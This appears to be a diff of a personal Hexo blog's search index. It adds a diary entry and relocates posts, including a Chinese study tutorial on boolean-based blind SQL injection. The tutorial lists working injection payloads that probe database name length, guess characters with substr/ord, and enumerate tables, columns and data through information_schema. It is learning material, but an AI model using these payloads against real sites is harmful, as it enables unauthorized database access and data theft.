@@ -78,6 +78,24 @@
       </tags>
   </entry>
   <entry>
+    <title>夫天地者，万物之逆旅也</title>
+    <url>/2022/11/08/Diary_1108/</url>
+    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
+<span id="more"></span>
+
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
+<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入之字符型和数字型判断</title>
     <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
@@ -125,26 +143,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>First Blog</title>
     <url>/2022/11/03/first_blog/</url>
     <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
@@ -186,6 +184,26 @@
         <tag>随想</tag>
         <tag>搭建博客</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>SQL注入之sqli-labs_1+2</title>
@@ -435,58 +453,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>布尔盲注</title>
-    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
-<span id="more"></span>
-
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
-<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-
-<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
-<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
-
-<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
-<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
-<li><p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>或</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>说明：如果写脚本，采用二分法更佳</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
-<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入，布尔盲注</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何寻觅动画</title>
     <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
     <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
@@ -597,6 +563,58 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>动画</tag>
         <tag>资源</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>布尔盲注</title>
+    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+
+<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
+<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：如果写脚本，采用二分法更佳</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
+<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入，布尔盲注</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
